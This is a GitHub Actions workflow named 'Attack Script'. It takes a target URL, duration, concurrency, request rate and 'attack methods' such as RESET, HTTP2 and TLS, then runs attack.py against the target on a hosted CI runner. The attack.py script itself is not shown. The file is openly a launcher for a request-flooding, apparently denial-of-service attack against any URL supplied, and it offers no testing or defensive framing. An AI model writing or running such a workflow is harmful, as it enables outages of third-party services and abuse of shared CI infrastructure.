name: Attack Script

on:
  workflow_dispatch:
    inputs:
      target_url:
        description: 'Target URL'
        required: true
        default: 'https://example.com'
      duration:
        description: 'Duration in seconds'
        required: true
        default: '60'
      concurrency:
        description: 'Number of concurrent connections'
        required: true
        default: '50'
      req_per_sec:
        description: 'Requests per second'
        required: true
        default: '10'
      methods:
        description: 'Attack methods (comma separated)'
        required: true
        default: 'GET,POST,DELETE,RESET,HTTP2,TLS'

jobs:
  attack:
    runs-on: ubuntu-latest
    
    steps:
    - name: Checkout code
      uses: actions/checkout@v3
      
    - name: Set up Python
      uses: actions/setup-python@v4
      with:
        python-version: '3.10'
        
    - name: Install dependencies
      run: |
        python -m pip install --upgrade pip
        pip install aiohttp
        
    - name: Run attack
      env:
        TARGET_URL: ${{ github.event.inputs.target_url }}
        DURATION: ${{ github.event.inputs.duration }}
        CONCURRENCY: ${{ github.event.inputs.concurrency }}
        REQ_PER_SEC: ${{ github.event.inputs.req_per_sec }}
        METHODS: ${{ github.event.inputs.methods }}
      run: python attack.py
